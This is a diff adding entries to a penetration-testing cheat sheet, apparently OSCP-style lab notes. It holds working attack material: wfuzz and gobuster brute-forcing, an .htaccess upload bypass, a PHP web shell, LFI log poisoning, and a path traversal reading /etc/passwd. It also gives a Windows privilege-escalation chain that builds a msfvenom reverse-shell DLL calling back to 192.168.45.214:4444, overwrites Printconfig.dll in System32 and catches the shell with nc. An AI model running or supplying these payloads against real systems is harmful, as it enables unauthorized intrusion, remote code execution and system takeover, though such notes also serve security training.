@@ -1013,6 +1013,9 @@ hydra -L users.txt -P password.txt <IP or domain> http-{post/get}-form "/path:na
 - API - Fuzz further and it can reveal some sensitive information
 
 ```powershell
+#WFUZZ
+wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-words.txt --hc 404 "http://192.168.104.187/FUZZ" # Foders uploads, data
+wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt  --hc 404 "http://192.168.104.187/FUZZ" # Files like .htaccess
 #identifying endpoints using gobuster
 gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern #pattern can be like {GOBUSTER}/v1 here v1 is just for example, it can be anything
 gobuster dir -u http://192.168.162.143/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt # It has big list
@@ -1391,11 +1394,22 @@ curl http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
 - Wordpress
     - Simple exploit: https://github.com/leonjza/wordpress-shell
 
-## Local File Inclusion
+## Local File Inclusion, File Uploads
 
 - Main difference between Directory traversal and this attack is, here we’re able to execute commands remotely.
 
 ```powershell
+#Cheching .htaccess, Upload this file and check whether it's accepting or not.
+cat .htaccess              
+#AddType application/x-httpd-php .evil, After accepting this run wfuzz for folders and files check is their any path user uploaded files.
+# Above we are allowing the .evil extension, So we can upload the files .evil extension
+cat ashok.evil 
+<pre>
+<?php
+system($_GET['cmd']);
+?>
+</pre>
+
 #At first we need 
 http://192.168.45.125/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=whoami #we're passing a command here
 
@@ -2141,6 +2155,19 @@ python3 mremoteng_decrypt.py -s yhgmiu5bbuamU3qMUKc/uYDdmbMrJZ/JvR1kYe4Bhiu8bXyb
 python3 spose/spose.py --proxy http://192.168.205.189:3128 --target 192.168.205.189
 # Found port 8080 phpmyadmin create database then executed shell
 <?php system($_GET['cmd']); ?>" into outfile "C:\\wamp\\www\\backdoor.php"
+```
+### SeManageVolumeExploit.exe(SeChangeNotifyPrivilege Bypass traverse checking) WinPrivEsc
+- If you have SeChangeNotifyPrivilege Bypass traverse checking in whoami /priv then try this, override the Printconfig.dll
+- This Scenario user svc_mssql have permission
+- S1ren's Access PG Pracess privileges escalation 
+
+```powershell
+.\SeManageVolumeExploit.exe # this change the entires nearly 917 or something
+msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=192.168.45.214 LPORT=4444 -f dll -o Printconfig.dll
+copy Printconfig.dll C:\Windows\System32\spool\drivers\x64\3\   # CLick yes to overwrite
+$type = [Type]::GetTypeFromCLSID("{854A20FB-2D44-457D-992F-EF13785D2B51}")  # start you listener nc -nlvp 4444
+$object = [Activator]::CreateInstance($type)
+rlwrap nc -lvnp 4444 # GOT shell
 ```
 
 ---
